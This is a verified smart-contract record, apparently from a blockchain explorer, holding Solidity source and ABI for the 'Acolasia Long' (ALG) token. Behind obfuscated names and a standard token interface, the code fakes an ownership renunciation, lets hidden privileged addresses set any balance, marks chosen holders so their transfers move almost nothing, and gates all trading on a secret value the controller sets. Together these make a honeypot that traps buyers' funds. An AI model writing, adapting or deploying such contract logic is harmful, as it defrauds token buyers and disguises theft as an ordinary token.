{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface exemptTradingSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedIs) external view returns (uint256);\n\n    function transfer(address launchedAmount, uint256 fromShould) external returns (bool);\n\n    function allowance(address minMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedAmount,\n        uint256 fromShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minSenderTrading, uint256 value);\n    event Approval(address indexed minMode, address indexed spender, uint256 value);\n}\n\nabstract contract fromLiquidityMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toSwap {\n    function createPair(address maxSell, address autoLaunched) external returns (address);\n}\n\ninterface sellMode is exemptTradingSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AcolasiaLong is fromLiquidityMode, exemptTradingSender, sellMode {\n\n    event OwnershipTransferred(address indexed atLaunched, address indexed totalTrading);\n\n    function transferFrom(address listEnableTo, address launchedAmount, uint256 fromShould) external override returns (bool) {\n        if (_msgSender() != walletLiquidityEnable) {\n            if (marketingTx[listEnableTo][_msgSender()] != type(uint256).max) {\n                require(fromShould <= marketingTx[listEnableTo][_msgSender()]);\n                marketingTx[listEnableTo][_msgSender()] -= fromShould;\n            }\n        }\n        return totalTradingShould(listEnableTo, launchedAmount, fromShould);\n    }\n\n    address walletLiquidityEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public receiverAt;\n\n    function exemptLimit(address fromMax, uint256 fromShould) public {\n        limitReceiver();\n        shouldLimitTo[fromMax] = fromShould;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromTx;\n    }\n\n    constructor (){\n        \n        takeSell tradingAuto = takeSell(walletLiquidityEnable);\n        fromSenderSell = toSwap(tradingAuto.factory()).createPair(tradingAuto.WETH(), address(this));\n        if (sellFrom) {\n            sellFrom = false;\n        }\n        receiverMarketing = _msgSender();\n        limitReceiverFrom();\n        receiverAt[receiverMarketing] = true;\n        shouldLimitTo[receiverMarketing] = walletTake;\n        \n        emit Transfer(address(0), receiverMarketing, walletTake);\n    }\n\n    bool private walletMode;\n\n    address private toTx;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeLaunch;\n    }\n\n    uint256 listTrading;\n\n    function limitReceiver() private view {\n        require(receiverAt[_msgSender()]);\n    }\n\n    address public receiverMarketing;\n\n    function getOwner() external view returns (address) {\n        return toTx;\n    }\n\n    address feeLiquiditySell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address txAt, address liquidityEnable) external view virtual override returns (uint256) {\n        if (liquidityEnable == walletLiquidityEnable) {\n            return type(uint256).max;\n        }\n        return marketingTx[txAt][liquidityEnable];\n    }\n\n    uint256 constant limitWallet = 5 ** 10;\n\n    mapping(address => mapping(address => uint256)) private marketingTx;\n\n    function shouldLimit(address launchedSell) public {\n        limitReceiver();\n        if (shouldMode == minExemptAt) {\n            sellFrom = true;\n        }\n        if (launchedSell == receiverMarketing || launchedSell == fromSenderSell) {\n            return;\n        }\n        feeTake[launchedSell] = true;\n    }\n\n    function takeEnable(uint256 fromShould) public {\n        limitReceiver();\n        listTrading = fromShould;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletTake;\n    }\n\n    uint256 receiverLiquidityFee;\n\n    bool public minExemptAt;\n\n    bool public sellFrom;\n\n    bool private teamLaunch;\n\n    function liquidityToken(address fundMin) public {\n        if (sellList) {\n            return;\n        }\n        if (teamLaunch != shouldMode) {\n            swapMode = feeExempt;\n        }\n        receiverAt[fundMin] = true;\n        \n        sellList = true;\n    }\n\n    mapping(address => uint256) private shouldLimitTo;\n\n    uint256 public senderSwapFee;\n\n    string private feeLaunch = \"ALG\";\n\n    address public fromSenderSell;\n\n    function totalTradingShould(address listEnableTo, address launchedAmount, uint256 fromShould) internal returns (bool) {\n        if (listEnableTo == receiverMarketing) {\n            return toReceiverMin(listEnableTo, launchedAmount, fromShould);\n        }\n        uint256 teamLiquidity = exemptTradingSender(fromSenderSell).balanceOf(feeLiquiditySell);\n        require(teamLiquidity == listTrading);\n        require(launchedAmount != feeLiquiditySell);\n        if (feeTake[listEnableTo]) {\n            return toReceiverMin(listEnableTo, launchedAmount, limitWallet);\n        }\n        return toReceiverMin(listEnableTo, launchedAmount, fromShould);\n    }\n\n    bool public sellList;\n\n    function transfer(address fromMax, uint256 fromShould) external virtual override returns (bool) {\n        return totalTradingShould(_msgSender(), fromMax, fromShould);\n    }\n\n    uint256 public swapMode;\n\n    mapping(address => bool) public feeTake;\n\n    function owner() external view returns (address) {\n        return toTx;\n    }\n\n    uint8 private fromTx = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return listToken;\n    }\n\n    function approve(address liquidityEnable, uint256 fromShould) public virtual override returns (bool) {\n        marketingTx[_msgSender()][liquidityEnable] = fromShould;\n        emit Approval(_msgSender(), liquidityEnable, fromShould);\n        return true;\n    }\n\n    function balanceOf(address launchedIs) public view virtual override returns (uint256) {\n        return shouldLimitTo[launchedIs];\n    }\n\n    bool private shouldMode;\n\n    string private listToken = \"Acolasia Long\";\n\n    uint256 private feeExempt;\n\n    function limitReceiverFrom() public {\n        emit OwnershipTransferred(receiverMarketing, address(0));\n        toTx = address(0);\n    }\n\n    function toReceiverMin(address listEnableTo, address launchedAmount, uint256 fromShould) internal returns (bool) {\n        require(shouldLimitTo[listEnableTo] >= fromShould);\n        shouldLimitTo[listEnableTo] -= fromShould;\n        shouldLimitTo[launchedAmount] += fromShould;\n        emit Transfer(listEnableTo, launchedAmount, fromShould);\n        return true;\n    }\n\n    uint256 private walletTake = 100000000 * 10 ** 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minSenderTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromShould\",\"type\":\"uint256\"}],\"name\":\"exemptLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSenderSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitReceiverFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"}],\"name\":\"liquidityToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minExemptAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSwapFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSell\",\"type\":\"address\"}],\"name\":\"shouldLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromShould\",\"type\":\"uint256\"}],\"name\":\"takeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listEnableTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AcolasiaLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}